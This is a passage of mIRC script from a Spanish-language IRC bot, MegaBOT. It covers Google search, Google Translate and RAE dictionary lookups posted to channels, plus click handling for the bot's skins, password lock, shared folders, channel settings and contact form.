  if ($1) && ($exists(google $+ $gettok($gettok($1,2,46),4,2) $+ .x) == $true) {
    sockclose $1
    unset %google.prin. $+ $1 %google.uad. $+ $1 %google.link. $+ $1 %google.tdec. $+ $1
    set %google.u. $+ $1 0
    .fclose $1 $+ *
    .fopen $1 google $+ $gettok($gettok($1,2,46),4,2) $+ .x
    while (!$feof) && (!$ferr) {
      %google = $mid($fread($1),1,900)
      if (%google.prin. [ $+ [ $1 ] ] == 1) {
        if (%google.uad. [ $+ [ $1 ] ] == 1) {
          if (http:// isin $gettok(%google,2,34)) || (www. isin $gettok(%google,2,34)) { if (!%google.link. [ $+ [ $1 ] ]) { set %google.link. $+ $1 $gettok(%google,2,34) } }
          if (%google.tdec. [ $+ [ $1 ] ]) {
            unset %google.uad. $+ $1
            if (%google.link. [ $+ [ $1 ] ]) {
              inc %google.u. $+ $1
              if (3 >= %google.u. [ $+ [ $1 ] ]) {
                msg $gettok($gettok($1,2,46),1,2) 02 %google.u. [ $+ [ $1 ] ] $+ ∫12  $+ %google.link. [ $+ [ $1 ] ] $+  $iif(%google.tdec. [ $+ [ $1 ] ] != 1,%google.tdec. [ $+ [ $1 ] ],$html(%google))
                unset %google.link. $+ $1
              }
              else { goto end }
            }
            unset %google.tdec. $+ $1
          }
          if (<span class="st"> isin %google) {
            if ($html(%google) != $null) { set %google.tdec. $+ $1 $html(%google) }
            else { set %google.tdec. $+ $1 1 }
          }
        }
        if (<h3 class="r"> isin %google) { unset %google.link. $+ $1 %google.tdec. $+ $1 | set %google.uad. $+ $1 1 }
      }
      if (">Resultados de la b√∫squeda< isin %google) { inc %google.prin. $+ $1 }
    }
    :end
    .fclose $1
    if (%google.u. [ $+ [ $1 ] ] == 0) { msg $gettok($gettok($1,2,46),1,2) 12G4o8o12g3l4e2 No se encontraron resultados para:12 $replace($gettok($gettok($1,2,46),3,2),+,$chr(32),% $+ 2B,+) }
    unset %google.prin. $+ $1 %google.uad. $+ $1 %google.u. $+ $1 %google.link. $+ $1 %google.tdec. $+ $1
    google.del google $+ $gettok($gettok($1,2,46),4,2) $+ .x
} }
alias google.del { if ($exists($1) == $true) { .remove $1 } }
alias google.exalink {
  var %google.n $r(1000,99999)
  var %google.tem $1 $+ $chr(2) $+ $2 $+ $chr(2) $+ $3 $+ $chr(2) $+ %google.n
  google.del google $+ %google.n $+ .x
  msg $1 12G4o8o12g3l4e 2Buscando los 3 primeros resultados..
  sockclose google. $+ %google.tem | sockopen google. $+ %google.tem www.google.com 80
}
alias traductor.on {
  var %traductor.n $r(100000,99999999)
  var %traductor.tem $1 $+ $chr(2) $+ $2 $+ $chr(2) $+ $chr(2) $+ %traductor.n
  set %traductor. $+ %traductor.n $3
  sockclose traductor. $+ %google.tem | sockopen traductor. $+ %traductor.tem www.google.com 80
}
on *:SOCKOPEN:traductor.*:{
  if ($sockerr == 0) {
    sockwrite -n $sockname GET /translate_a/t?client=t&text= $+ %traductor. [ $+ [ $gettok($sockname,3,2) ] ] $+ &hl=es&sl=auto&tl=es&multires=1&otf=1&ssel=0&tsel=0&uptl=es&alttl=en&sc=1 HTTP/1.1
    sockwrite -n $sockname Host: translate.google.es
    sockwrite -n $sockname Connection: keep.alive
    sockwrite -n $sockname User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2
    sockwrite -n $sockname Accept: */*
    sockwrite -n $sockname Referer: http://translate.google.es/?hl=es&tab=wT
    sockwrite -n $sockname Accept-Encoding: deflate
    sockwrite -n $sockname Accept-Language: es-ES,es;q=0.8
    sockwrite -n $sockname Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
    sockwrite -n $sockname $crlf
  }
  else { unset %traductor. $+ $gettok($sockname,3,2) | msg $gettok($gettok($sockname,2,46),1,2) 2Traductor2 ERROR: No se pudo conectar con el traductor. }
}
on *:SOCKREAD:traductor.*:{
  sockread %trad
  %trad = $left(%trad,800)
  if ([[[" isin %trad) {
    %trad2 = $traductor.idioma($remove($gettok($gettok(%trad,2,93),1,91),$chr(44),"))
    if ($remove($gettok($gettok(%trad,2,93),1,91),$chr(44),") == es) { msg $gettok($gettok($sockname,2,46),1,2) 2Traductor2 ERROR: El texto:12 $replace(%traductor. [ $+ [ $gettok($sockname,3,2) ] ],+,$chr(32),% $+ 2B,+) 2ya est· en espaÒol. | goto e }
    if (%trad2 == $null) || ($gettok(%trad,4,34) == $gettok(%trad,2,34)) { msg $gettok($gettok($sockname,2,46),1,2) 2Traductor2 ERROR: No se encontro el idioma para:12 $replace(%traductor. [ $+ [ $gettok($sockname,3,2) ] ],+,$chr(32),% $+ 2B,+) $+ 2. }
    else { msg $gettok($gettok($sockname,2,46),1,2) 2Traductor2 Idioma:12 %trad2 $+ 2, la traducciÛn para12 $replace(%traductor. [ $+ [ $gettok($sockname,3,2) ] ],+,$chr(32),% $+ 2B,+) 2es12 $html($gettok(%trad,2,34)) }
    :e 
    unset %traductor. $+ $gettok($sockname,3,2)
    sockclose $sockname
  }
}
alias traductor.idioma {
  unset %trad.i
  if ($1 == eu) { %trad.i = Euskera }
  if ($1 == af) { %trad.i = Afrikaans }
  if ($1 == sq) { %trad.i = AlbanÈs }
  if ($1 == de) { %trad.i = Alem·n }
  if ($1 == tr) { %trad.i = Azerbaijani }
  if ($1 == ca) { %trad.i = Catal·n }
  if ($1 == sk) { %trad.i = Checo }
  if ($1 == ht) { %trad.i = Criollo haitiano }
  if ($1 == da) { %trad.i = DanÈs }
  if ($1 == cs) { %trad.i = Eslovaco }
  if ($1 == et) { %trad.i = Estonio }
  if ($1 == fi) { %trad.i = FinlandÈs }
  if ($1 == fr) { %trad.i = FrancÈs }
  if ($1 == cy) { %trad.i = GalÈs }
  if ($1 == pt) { %trad.i = PortuguÈs }
  if ($1 == nl) { %trad.i = HolandÈs }
  if ($1 == hu) { %trad.i = H˙ngaro }
  if ($1 == id) { %trad.i = Indonesio }
  if ($1 == en) { %trad.i = InglÈs }
  if ($1 == ga) { %trad.i = IrlandÈs }
  if ($1 == is) { %trad.i = IslandÈs }
  if ($1 == it) { %trad.i = Italiano }
  if ($1 == sw) { %trad.i = Suajili }
  if ($1 == sv) { %trad.i = Sueco }
  if ($1 == tl) { %trad.i = Tagalo }
  if ($1 == tr) { %trad.i = Turco }
  if ($1 == vi) { %trad.i = Vietnamita }
  if ($1 == ro) { %trad.i = Rumano }
  return %trad.i
}
ON *:sockopen:dic.*:{
  dcdelarc
  set %sock.troz $replace($sockname,$chr(3),$chr(32),$chr(2),$chr(32)) | if ( $sockerr > 0 ) { .msg $gettok(%sock.troz,2,32) 12Diccionario2 Fallo en la conexiÛn. | halt }
  sockwrite -n $sockname GET /drae/srv/search?val= $+ $gettok(%sock.troz,3,32) HTTP/1.1
  sockwrite -n $sockname Host: lema.rae.es
  sockwrite -n $sockname Connection: keep-alive
  sockwrite -n $sockname User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11
  sockwrite -n $sockname Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  sockwrite -n $sockname Referer: http://lema.rae.es/drae/?val= $+ $gettok(%sock.troz,3,32)
  sockwrite -n $sockname Accept-Encoding: deflate
  sockwrite -n $sockname Accept-Language: es-ES,es;q=0.8
  sockwrite -n $sockname Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
  sockwrite -n $sockname $crlf
  .timerdic. $+ $sockname 1 5 dcreadarc0 $sockname
}
ON *:sockread:dic.*:{ sockread &dic | bwrite dc.x -1 &dic | .timerdic. $+ $sockname 1 1 dcreadarc0 $sockname }
alias dcreadarc0 { sockclose $1 | if ($exists(dc.x) == $true) { dll %RHDl $+ breaker.dll breakhtml dc.x } | .timerdc.breaker. $+ $1 1 1 dcreadarc $1 }
alias dcdelarc { if ($exists(dc.x) == $true) { .remove dc.x } }
alias dcreadarc {
  if ($1) {
    unset %dc.temp*
    var %dcread.return $replace($1,$chr(3),$chr(32),$chr(2),$chr(32))
    .fopen dc dc.x
    while (!$feof) && (!$ferr) {
      var %dc $html($fread(dc))
      if (Todos los derechos reservados isin %dc) { goto end }
      if ($left(%dc,1) isnum) && ($mid(%dc,2,1) == .) {
        if ($left(%dc,1) > 3) { goto end }
        set %dc.temp1 $left(%dc,1) | unset %dc.temp2o
      }
      if (%dc) && (%dc.temp2o) { set %dc.temp2. [ $+ [ %dc.temp2o ] ] %dc.temp2. [ $+ [ %dc.temp2o ] ] %dc }
      if (. isin $left(%dc,5)) && (%dc.temp1 isnum) { set %dc.temp2o %dc.temp1 }
    }
    :end
    .fclose dc
    dcdelarc
    if (%dc.temp2.1) {
      msg $gettok(%dcread.return,2,32) 2D2iccionario: Resultados para:12 $gettok(%dcread.return,3,32) $+ 2.
      if (%dc.temp2.1) { msg $gettok(%dcread.return,2,32) 12 $+ 1 $+ 2 $remove(%dc.temp2.1,&#32;) }
      if (%dc.temp2.2) { msg $gettok(%dcread.return,2,32) 12 $+ 2 $+ 2 $remove(%dc.temp2.2,&#32;) }
      if (%dc.temp2.3) { msg $gettok(%dcread.return,2,32) 12 $+ 3 $+ 2 $remove(%dc.temp2.3,&#32;) }
    }
    else { msg $gettok(%dcread.return,2,32) 2D2iccionario: La palabra12 $gettok(%dcread.return,3,32) 2no est· en el diccionario. }
} }
alias skinsel { skins.sb | skins.list | return $nopath($findfile(Sistema\skins,*.zip;*.rar,$calc($calc($iif($1,$1,%skins.nm) + %skins.scrl) - 1),1)) }
alias rdsk { set %color $iif($readini(Sistema\base\skins.ini,dats,c),$readini(Sistema\base\skins.ini,dats,c),0) | drawpic -c | datv- $+ $remove(%act,@) | drawpic -c | datv- $+ $remove(%act,@) }
on *:close:@MegaBOT:{ .timerclosemb -mo 1 1 principal }
on *:close:@protegido:{ if (%prct) { .timercloseprotegido -mo 1 1 protegido } }
on *:close:@Stats:{ .timerclosestats -mo 1 1 statsconf }
alias mb.move {
  if ($active == @MegaBOT) || ($active == @c-l) || ($active == @noticias) {
    ezit.edit
    %winy = $iif(0 > $calc($mouse.dy - $2),0,$calc($mouse.dy - $2))
    set %mbot.dim $calc($mouse.dx - $1) %winy
    window @MegaBOT %mbot.dim
    if ($active == @c-l) { window +d @c-l $calc(224 + $gettok(%mbot.dim,1,32)) $calc(144 + $gettok(%mbot.dim,2,32)) 400 285 }
    if ($active == @noticias) { window +d @noticias $calc(223 + $gettok(%mbot.dim,1,32)) $calc(123 + $gettok(%mbot.dim,2,32)) 400 280 }
    .timermb.move -om 1 1 mb.move $1-
} }
Menu @* {
  leave: { if ($leftwin == @MegaBOT) { .timermb.move off | if ($remove(%act,@)) { datv- $+ $remove(%act,@) } } }
  Uclick: {
    if ($active != @error) {
      .timermb.move off
      if ($mouse.y >= 373) && ($mouse.y < 402) && ($mouse.x > 592) && ($mouse.x < 623) { .timersbjcb off | unset %sbjcb }
      if ($mouse.y >= 373) && ($mouse.y < 401) && ($mouse.x > 592) && ($mouse.x < 623) { .timersbjcb off | unset %sbjcb }
      if ($mouse.y >= 369) && ($mouse.y < 397) && ($mouse.x > 603) && ($mouse.x < 635) { .timersbskins off }
      if ($mouse.y >= 397) && ($mouse.y < 426) && ($mouse.x > 592) && ($mouse.x < 623) { .timersbjcb off | unset %sbjcb }
      if ($mouse.y >= 235) && ($mouse.y < 263) && ($mouse.x > 592) && ($mouse.x < 623) { .timersbjcb off | unset %sbjcb }
      if ($mouse.y >= 125) && ($mouse.y < 154) && ($mouse.x > 584) && ($mouse.x < 614) { .timersbjcb off | unset %sbjcb }
      if ($mouse.y >= 146) && ($mouse.y < 173) && ($mouse.x > 592) && ($mouse.x < 623) { .timersbjcb off | unset %sbjcb }
      if ($mouse.y >= 360) && ($mouse.y < 389) && ($mouse.x > 584) && ($mouse.x < 614) { .timersbjcb off | unset %sbjcb }
      if ($mouse.y >= 214) && ($mouse.y < 241) && ($mouse.x > 592) && ($mouse.x < 623) { .timersbjcb off | unset %sbjcb }
      if ($mouse.y >= 133) && ($mouse.y < 161) && ($mouse.x > 603) && ($mouse.x < 635) { .timersbskins off }
    }
  }
  Sclick : {
    if ($active == @error) { if ($mouse.y >= 292) && ($mouse.y < 328) && ($mouse.x > 375) && ($mouse.x < 424) { wc error | if ($remove(%act,@)) { $remove(%act,@) } | else { principal } } | statsconf | halt }
    if ($active == @salir) {
      if ($mouse.y >= 283) && ($mouse.y < 330) && ($mouse.x > 160) && ($mouse.x < 205) { wc salir | if ($remove(%act,@)) { $remove(%act,@) } | else { principal } | statsconf | halt }
      if ($mouse.y >= 288) && ($mouse.y < 325) && ($mouse.x > 240) && ($mouse.x < 288) { ezit }
    }
    if ($active == @protegido) {
      if ($mouse.y >= 254) && ($mouse.y < 275) && ($mouse.x > 175) && ($mouse.x < 363) { wc pro.u | wne @pro.u 323 274 183 21 | editbox @pro.u %pro.u | wn pro.u }
      if ($mouse.y >= 280) && ($mouse.y < 300) && ($mouse.x > 175) && ($mouse.x < 363) { wc pro.p | wne @pro.p 323 300 183 21 | editbox @pro.p %pro.p | wn pro.p }
      if ($mouse.y >= 309) && ($mouse.y < 345) && ($mouse.x > 315) && ($mouse.x < 364) { if (%pro.u === $decode($decode($hget(prote,u),m),m)) && ($hget(prote,p) === $md5($md5($md5(%pro.p)))) { wc protegido | unset %prct %pro.u %pro.p | if ($remove(%act,@)) { $remove(%act,@) } | else { principal } | statsconf } | unset %pro.u %pro.p | datv-protegido | drtex protegido 19 145 315 $decode(oUNsYXZlIGluY29ycmVjdGEh,m) }
    }
    if ($active == @MegaBOT) {
      if ($mouse.y >= 4) && ($mouse.y < 53) && ($mouse.x > 515) && ($mouse.x < 564) { run http://www.facebook.com/groups/189917457699223 | return }
      if ($mouse.y >= 8) && ($mouse.y < 54) && ($mouse.x > 587) && ($mouse.x < 627) { run http://maincenter.es/mc-services/megabot/3.7/manual/index.htm | return }
      if ($mouse.y >= 0) && ($mouse.y < 56) && ($mouse.x > 0) && ($mouse.x < 639) { mb.move $calc($mouse.dx - $window($active).x) $calc($mouse.dy - $window($active).y) }
      if (%act == @noticias) {
        if ($mouse.y >= 125) && ($mouse.y < 154) && ($mouse.x > 584) && ($mouse.x < 614) { set %sbjcb o | sbjcb sclnoticis b datv-noticias 16 @dnot }
        if ($mouse.y >= 360) && ($mouse.y < 389) && ($mouse.x > 584) && ($mouse.x < 614) { set %sbjcb o | sbjcb sclnoticis s datv-noticias 16 @dnot }
        if ($mouse.y >= 420) && ($mouse.y < 460) && ($mouse.x > 569) && ($mouse.x < 614) { if (!$sock(noticias).status) { clear @dnot | set %sclnoticis 0 | datv-noticias | noticias.c } }
      }
      if (%act == @comandos) {
        if ($mouse.y >= 146) && ($mouse.y < 173) && ($mouse.x > 592) && ($mouse.x < 623) { set %sbjcb o | sbjcb ccomdts b datv-comandos 13 @dcomand }
        if ($mouse.y >= 397) && ($mouse.y < 426) && ($mouse.x > 592) && ($mouse.x < 623) { set %sbjcb o | sbjcb ccomdts s datv-comandos 13 @dcomand }
      }
      if (%act == @contacto) {
        if (%act.m == 2) {
          if ($mouse.y >= 128) && ($mouse.y < 154) && ($mouse.x > 446) && ($mouse.x < 626) { wc contacto.n | wne @contacto.n $calc(449 + $gettok(%mbot.dim,1,32)) $calc(130 + $gettok(%mbot.dim,2,32)) 175 21 | editbox @contacto.n %contacto.n | wn contacto.n }
          if ($mouse.y >= 156) && ($mouse.y < 181) && ($mouse.x > 446) && ($mouse.x < 626) { wc contacto.e | wne @contacto.e $calc(449 + $gettok(%mbot.dim,1,32)) $calc(158 + $gettok(%mbot.dim,2,32)) 175 21 | editbox @contacto.e %contacto.e | wn contacto.e }
          if ($mouse.y >= 184) && ($mouse.y < 208) && ($mouse.x > 446) && ($mouse.x < 626) { wc contacto.a | wne @contacto.a $calc(449 + $gettok(%mbot.dim,1,32)) $calc(186 + $gettok(%mbot.dim,2,32)) 175 21 | editbox @contacto.a %contacto.a | wn contacto.a }
          if ($mouse.y >= 213) && ($mouse.y < 403) && ($mouse.x > 347) && ($mouse.x < 588) { wc contacto.m | wne @contacto.m $calc(350 + $gettok(%mbot.dim,1,32)) $iif($calc($mouse.y + $gettok(%mbot.dim,2,32)) > $calc(380 + $gettok(%mbot.dim,2,32)),$calc(380 + $gettok(%mbot.dim,2,32)),$calc($mouse.y + $gettok(%mbot.dim,2,32))) 236 21 | editbox @contacto.m %contacto.m | wn contacto.m }
          if ($mouse.y >= 214) && ($mouse.y < 241) && ($mouse.x > 592) && ($mouse.x < 623) { set %sbjcb o | sbjcb cconts b datv-contacto 8 @dcont }
          if ($mouse.y >= 373) && ($mouse.y < 401) && ($mouse.x > 592) && ($mouse.x < 623) { set %sbjcb o | sbjcb cconts s datv-contacto 8 @dcont }
          if ($mouse.y >= 424) && ($mouse.y < 461) && ($mouse.x > 576) && ($mouse.x < 624) { if (%contacto.m) && (%contacto.n) && (%contacto.a) && (@ isin %contacto.e) { datv-contacto | sockopen contacto.megabotmail.php www.maincenter.es 80 } | else { set %cnt.msgca %contacto.a | set %cnt.msgc %contacto.m | set %err.l1 Para enviar un e-mail rellena | set %err.l2 los compos obligatorios: | set %err.l2 * Nombre\Apodo | set %err.l3 * Su direcciÛn de correo | set %err.l4 * Asunto del e-mail | set %err.l5 * Mensaje | error } }
          if ($mouse.y >= 422) && ($mouse.y < 464) && ($mouse.x > 512) && ($mouse.x < 559) { unset %contacto.a %contacto.m | window -c @dcont | datv-contacto }
        }
      }
      if (%act.m == 1) {
        if (%act == @skins) {
          if ($mouse.y >= 434) && ($mouse.y < 450) && ($mouse.x > 225) && ($mouse.x < 269) { if ($skinsel) { if ($?!="Estas seguro que deseas eliminar las skins de $crlf $skinsel $+ ?" == $true) { if ($exists($shortfn(sistema\skins\ $+ $skinsel)) == $true) { .remove $shortfn(sistema\skins\ $+ $skinsel) } } } | skins.sb | skins.list }
          if ($mouse.y >= 420) && ($mouse.y < 466) && ($mouse.x > 512) && ($mouse.x < 558) { if (%nknz) && ($dll(%RHDl $+ zip.dll,SUnZipFile,Sistema\Skins\ $+ %nknz > Sistema) == Z_OK) { .timerrf 1 1 rdsk } }
          if ($mouse.y >= 424) && ($mouse.y < 459) && ($mouse.x > 576) && ($mouse.x < 622) { if ($dll(%RHDl $+ zip.dll,SUnZipFile,Sistema\Skins\ $+ $skinsel > Sistema) == Z_OK) { .timerrf 1 1 rdsk } }
          if ($mouse.y >= 369) && ($mouse.y < 397) && ($mouse.x > 603) && ($mouse.x < 635) { sknsb b }
          if ($mouse.y >= 133) && ($mouse.y < 161) && ($mouse.x > 603) && ($mouse.x < 635) { sknsb s }
          if ($mouse.y >= 140) && ($mouse.y < 161) && ($mouse.x > 229) && ($mouse.x < 594) && ($skinsel(1)) { set %skins.nm 1 | datv-skins }
          if ($mouse.y >= 169) && ($mouse.y < 191) && ($mouse.x > 229) && ($mouse.x < 594) && ($skinsel(2)) { set %skins.nm 2 | datv-skins }
          if ($mouse.y >= 199) && ($mouse.y < 221) && ($mouse.x > 229) && ($mouse.x < 594) && ($skinsel(3)) { set %skins.nm 3 | datv-skins }
          if ($mouse.y >= 229) && ($mouse.y < 252) && ($mouse.x > 229) && ($mouse.x < 594) && ($skinsel(4)) { set %skins.nm 4 | datv-skins }
          if ($mouse.y >= 259) && ($mouse.y < 282) && ($mouse.x > 229) && ($mouse.x < 594) && ($skinsel(5)) { set %skins.nm 5 | datv-skins }
          if ($mouse.y >= 289) && ($mouse.y < 311) && ($mouse.x > 229) && ($mouse.x < 594) && ($skinsel(6)) { set %skins.nm 6 | datv-skins }
          if ($mouse.y >= 320) && ($mouse.y < 342) && ($mouse.x > 229) && ($mouse.x < 594) && ($skinsel(7)) { set %skins.nm 7 | datv-skins }
          if ($mouse.y >= 349) && ($mouse.y < 372) && ($mouse.x > 229) && ($mouse.x < 594) && ($skinsel(8)) { set %skins.nm 8 | datv-skins }
        }
        if (%act == @proteccion) {
          if ($mouse.y >= 324) && ($mouse.y < 371) && ($mouse.x > 496) && ($mouse.x < 543) { hdel prote segr | hsave -o prote %rhcn $+ prote.hash | datv-proteccion }
          if ($mouse.y >= 328) && ($mouse.y < 364) && ($mouse.x > 560) && ($mouse.x < 608) {
            if (!$hget(prote,u)) || (!$hget(prote,p)) { set %err.l1 Para bloquear el bot tiene | set %err.l2 que configurar los | set %err.l3 datos. | error }
            else { hadd prote segr y | hsave -o prote %rhcn $+ prote.hash | datv-proteccion }
          }
          if ($mouse.y >= 200) && ($mouse.y < 224) && ($mouse.x > 352) && ($mouse.x < 612) { if ($hget(prote,segr)) { set %err.l1 Para cambiar la configuraciÛn | set %err.l2 primero desactive la | set %err.l3 protecciÛn. | error } | else { wc USER.PROT | wne @USER.PROT $calc(355 + $gettok(%mbot.dim,1,32)) $calc(201 + $gettok(%mbot.dim,2,32)) 255 22 | editbox @USER.PROT $decode($decode($hget(prote,u),m),m) | wn USER.PROT } }
          if ($mouse.y >= 240) && ($mouse.y < 265) && ($mouse.x > 352) && ($mouse.x < 612) { if ($hget(prote,segr)) { set %err.l1 Para cambiar la configuraciÛn | set %err.l2 primero desactive la | set %err.l3 protecciÛn. | error } | else { wc USER.PASS | wne @USER.PASS $calc(355 + $gettok(%mbot.dim,1,32)) $calc(241 + $gettok(%mbot.dim,2,32)) 255 22 | wn USER.PASS } }
          if ($mouse.y >= 325) && ($mouse.y < 370) && ($mouse.x > 429) && ($mouse.x < 474) {
            if (!$hget(prote,segr)) { set %err.l1 Para bloquear el bot tiene | set %err.l2 que activar primero la | set %err.l3 protecciÛn. | error }
          else { if (!$hget(prote,u)) || (!$hget(prote,p)) { set %err.l1 Para bloquear el bot tiene | set %err.l2 que configurar los | set %err.l3 datos. | error } | else { crrt | protegido } } }
        }
        if (%act == @descargas) {
          %SDC = Seleccione el directorio que desea compartir. $crlf Se comparten todos los archivos *.* $crlf AVISO: No se incluyen subcarpetas
          if ($mouse.y >= 160) && ($mouse.y < 191) && ($mouse.x > 605) && ($mouse.x < 635) { set %DIRCOMP1 $$sdir=" %SDC " | datv-descargas }
          if ($mouse.y >= 212) && ($mouse.y < 244) && ($mouse.x > 605) && ($mouse.x < 635) { set %DIRCOMP2 $$sdir=" %SDC " | datv-descargas }
          if ($mouse.y >= 264) && ($mouse.y < 296) && ($mouse.x > 605) && ($mouse.x < 635) { set %DIRCOMP3 $$sdir=" %SDC " | datv-descargas }
          if ($mouse.y >= 316) && ($mouse.y < 348) && ($mouse.x > 605) && ($mouse.x < 635) { set %DIRCOMP4 $$sdir=" %SDC " | datv-descargas }
          if ($mouse.y >= 368) && ($mouse.y < 400) && ($mouse.x > 605) && ($mouse.x < 635) { set %DIRCOMP5 $$sdir=" %SDC " | datv-descargas }
          if ($mouse.y >= 420) && ($mouse.y < 452) && ($mouse.x > 605) && ($mouse.x < 635) { set %DIRCOMP6 $$sdir=" %SDC " | datv-descargas }
          if ($mouse.y >= 160) && ($mouse.y < 191) && ($mouse.x > 572) && ($mouse.x < 602) { unset %DIRCOMP1 | datv-descargas }
          if ($mouse.y >= 212) && ($mouse.y < 244) && ($mouse.x > 572) && ($mouse.x < 602) { unset %DIRCOMP2 | datv-descargas }
          if ($mouse.y >= 264) && ($mouse.y < 296) && ($mouse.x > 572) && ($mouse.x < 602) { unset %DIRCOMP3 | datv-descargas }
          if ($mouse.y >= 316) && ($mouse.y < 348) && ($mouse.x > 572) && ($mouse.x < 602) { unset %DIRCOMP4 | datv-descargas }
          if ($mouse.y >= 368) && ($mouse.y < 400) && ($mouse.x > 572) && ($mouse.x < 602) { unset %DIRCOMP5 | datv-descargas }
          if ($mouse.y >= 420) && ($mouse.y < 452) && ($mouse.x > 572) && ($mouse.x < 602) { unset %DIRCOMP6 | datv-descargas }
        }
        if (%act == @canales) {
          if ($mouse.y >= 189) && ($mouse.y < 235) && ($mouse.x > 574) && ($mouse.x < 609) {
            if (%CA.C) {
              set %CA.U $iif($mid(%CA.C,1,1) != $chr(35),$chr(35) $+ %CA.C,%CA.C)
              if (!%CA.M) { set %err.l1 AÒade un nick master como | set %err.l2 minimo. | error }
              else {
                if ($hmatch(canales,%CA.U)) { hadd masters %CA.U %CA.M | hadd canales %CA.U %CA.P | unset %CA.C %CA.P %CA.M %cl | hsave -o masters %rhcn $+ masters.hash | hsave -o canales %rhcn $+ canales.hash | dath-canales }
              elseif ($hget(canales,0).item != $chr(53)) { set %m- [ $+ [ %CA.C ] ] %CA.M | hadd canales %CA.U %CA.P | hadd masters %CA.U %CA.M | unset %CA.C %CA.P %CA.M %cl | hsave -o masters %rhcn $+ masters.hash | hsave -o canales %rhcn $+ canales.hash | dath-canales } }
            }
          }
          if ($mouse.y >= 96) && ($mouse.y < 120) && ($mouse.x > 328) && ($mouse.x < 616) { wc CA.M | unset %cl | wne @CA.M $calc(331 + $gettok(%mbot.dim,1,32)) $calc(97 + $gettok(%mbot.dim,2,32)) 283 22 | editbox @CA.M %CA.M | wn CA.M }
          if ($mouse.y >= 128) && ($mouse.y < 153) && ($mouse.x > 328) && ($mouse.x < 616) { if (%conb) { set %err.l1 Desconecte el bot para | set %err.l2 modificar los canales. | error | halt } | wc CA.C | unset %cl | wne @CA.C $calc(331 + $gettok(%mbot.dim,1,32)) $calc(129 + $gettok(%mbot.dim,2,32)) 283 22 | editbox @CA.C %CA.C | wn CA.C }
          if ($mouse.y >= 160) && ($mouse.y < 185) && ($mouse.x > 328) && ($mouse.x < 616) { if (%conb) { set %err.l1 Desconecte el bot para | set %err.l2 modificar los canales. | error | halt } | wc CA.P | unset %cl | wne @CA.P $calc(331 + $gettok(%mbot.dim,1,32)) $calc(161 + $gettok(%mbot.dim,2,32)) 283 22 | editbox @CA.P %CA.P | wn CA.P }
          if ($mouse.y >= 240) && ($mouse.y < 265) && ($mouse.x > 241) && ($mouse.x < 610) && (%cl != 1) && ($hget(canales,1).item) { set %cl 1 | dath-canales }
          if ($mouse.y >= 269) && ($mouse.y < 293) && ($mouse.x > 241) && ($mouse.x < 610) && (%cl != 2) && ($hget(canales,2).item) { set %cl 2 | dath-canales }
          if ($mouse.y >= 298) && ($mouse.y < 323) && ($mouse.x > 241) && ($mouse.x < 610) && (%cl != 3) && ($hget(canales,3).item) { set %cl 3 | dath-canales }
          if ($mouse.y >= 327) && ($mouse.y < 352) && ($mouse.x > 241) && ($mouse.x < 610) && (%cl != 4) && ($hget(canales,4).item) { set %cl 4 | dath-canales }
          if ($mouse.y >= 356) && ($mouse.y < 381) && ($mouse.x > 241) && ($mouse.x < 610) && (%cl != 5) && ($hget(canales,5).item) { set %cl 5 | dath-canales }
          if ($mouse.y >= 401) && ($mouse.y < 442) && ($mouse.x > 573) && ($mouse.x < 613) && (%cl) { set %CA.C $hget(canales,%cl).item | set %CA.P $hget(canales,$hget(canales,%cl).item) | set %CA.M $hget(masters,$hget(canales,%cl).item) | unset %cl | dath-canales }
          if ($mouse.y >= 410) && ($mouse.y < 426) && ($mouse.x > 514) && ($mouse.x < 558) && (%cl) {
            if (%conb) { set %err.l1 Desconecte el bot para | set %err.l2 modificar los canales. | error | halt }
            if ($exists(%rHcN $+ frases- $+ $hget(canales,%cl).item $+ .txt) == $true) { .remove %rHcN $+ frases- $+ $hget(canales,%cl).item $+ .txt }
            if ($exists(%rHcN $+ antispam- $+ $hget(canales,%cl).item $+ .txt) == $true) { .remove %rHcN $+ antispam- $+ $hget(canales,%cl).item $+ .txt }
            unset %antispam. [ $+ [ $hget(canales,%cl).item ] ] %ANTIPROXYS. [ $+ [ $hget(canales,%cl).item ] ] %AUTOLIMIT. [ $+ [ $hget(canales,%cl).item ] ]
            unset %antimayus. [ $+ [ $hget(canales,%cl).item ] ] %norepit. [ $+ [ $hget(canales,%cl).item ] ]
            unset %BANS.EXP. [ $+ [ $hget(canales,%cl).item ] ] %ElMUNDO- [ $+ [ $hget(canales,%cl).item ] ]
            unset %DEPTES- [ $+ [ $hget(canales,%cl).item ] ] %rvmsg- [ $+ [ $hget(canales,%cl).item ] ] | unset %vist- [ $+ [ $hget(canales,%cl).item ] ] %web- [ $+ [ $hget(canales,%cl).item ] ] | unset %PREFIX- [ $+ [ $hget(canales,%cl).item ] ]
            unset %UYOUTUBE- [ $+ [ $hget(canales,%cl).item ] ] | unset %UDIC- [ $+ [ $hget(canales,%cl).item ] ] | unset %UGOOGLE- [ $+ [ $hget(canales,%cl).item ] ] %UHOROS- [ $+ [ $hget(canales,%cl).item ] ]
            unset %Utiempo- [ $+ [ $hget(canales,%cl).item ] ] | unset %AVISA.CANAL- [ $+ [ $hget(canales,%cl).item ] ] | unset %ANTITELEFONOS. [ $+ [ $hget(canales,%cl).item ] ]
            unset %ASALUDO.CANAL. [ $+ [ $hget(canales,%cl).item ] ] %AUTO.BANNER. [ $+ [ $hget(canales,%cl).item ] ] %CANAL.NCOM. [ $+ [ $hget(canales,%cl).item ] ]
            unset %ANTIREPES- [ $+ [ $hget(canales,%cl).item ] ] | unset %rvhe- [ $+ [ $hget(canales,%cl).item ] ] %AHE- [ $+ [ $hget(canales,%cl).item ] ] | hdel masters $hget(canales,%cl).item | hdel canales $hget(canales,%cl).item | unset %cl | dath-canales | hsave -o masters %rhcn $+ masters.hash | hsave -o canales %rhcn $+ canales.hash
            stats.reset $hget(canales,%cl).item
          }
        }
        if (%act == @conexion) {
          if ($mouse.y >= 144) && ($mouse.y < 169) && ($mouse.x > 352) && ($mouse.x < 612) { wc SERVIDOR | wne @SERVIDOR $calc(355 + $gettok(%mbot.dim,1,32)) $calc(145 + $gettok(%mbot.dim,2,32)) 255 22 | editbox @SERVIDOR %SERVIDOR | wn SERVIDOR }
